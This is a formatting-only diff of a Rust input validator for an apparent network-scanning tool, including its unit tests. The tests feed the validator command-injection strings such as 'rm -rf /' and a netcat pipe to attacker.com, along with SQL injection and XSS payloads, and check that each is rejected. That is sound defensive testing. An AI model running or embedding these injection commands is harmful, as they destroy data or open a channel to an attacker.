@@ -112,9 +112,7 @@ impl InputValidator {
         }
 
         if self.contains_injection_pattern(trimmed) {
-            return Err(anyhow!(
-                "Target contains potentially malicious pattern"
-            ));
+            return Err(anyhow!("Target contains potentially malicious pattern"));
         }
 
         if self.blocked_targets.contains(trimmed) {
@@ -220,7 +218,14 @@ impl InputValidator {
     }
 
     pub fn validate_timing_value(&self, value: &str) -> Result<String> {
-        let valid_timings = ["paranoid", "sneaky", "polite", "normal", "aggressive", "insane"];
+        let valid_timings = [
+            "paranoid",
+            "sneaky",
+            "polite",
+            "normal",
+            "aggressive",
+            "insane",
+        ];
         let lower = value.to_lowercase();
         if valid_timings.contains(&lower.as_str()) {
             Ok(lower)
@@ -234,7 +239,9 @@ impl InputValidator {
     }
 
     pub fn validate_scan_type(&self, scan_type: &str) -> Result<String> {
-        let valid_types = ["tcp", "udp", "syn", "connect", "ack", "window", "null", "fin", "xmas"];
+        let valid_types = [
+            "tcp", "udp", "syn", "connect", "ack", "window", "null", "fin", "xmas",
+        ];
         let lower = scan_type.to_lowercase();
         if valid_types.contains(&lower.as_str()) {
             Ok(lower)
@@ -493,22 +500,30 @@ mod tests {
     fn test_injection_prevention() {
         let validator = InputValidator::new();
         assert!(validator.validate_target("192.168.1.1; rm -rf /").is_err());
-        assert!(validator.validate_target("192.168.1.1 | nc attacker.com 1234").is_err());
+        assert!(validator
+            .validate_target("192.168.1.1 | nc attacker.com 1234")
+            .is_err());
         assert!(validator.validate_target("192.168.1.1 $(evil)").is_err());
     }
 
     #[test]
     fn test_sql_injection_prevention() {
         let validator = InputValidator::new();
-        assert!(validator.validate_target("192.168.1.1 UNION SELECT").is_err());
-        assert!(validator.validate_target("192.168.1.1; DROP TABLE").is_err());
+        assert!(validator
+            .validate_target("192.168.1.1 UNION SELECT")
+            .is_err());
+        assert!(validator
+            .validate_target("192.168.1.1; DROP TABLE")
+            .is_err());
         assert!(validator.validate_target("192.168.1.1--").is_err());
     }
 
     #[test]
     fn test_xss_prevention() {
         let validator = InputValidator::new();
-        assert!(validator.validate_target("<script>alert(1)</script>").is_err());
+        assert!(validator
+            .validate_target("<script>alert(1)</script>")
+            .is_err());
         assert!(validator.validate_target("javascript:alert(1)").is_err());
     }
 
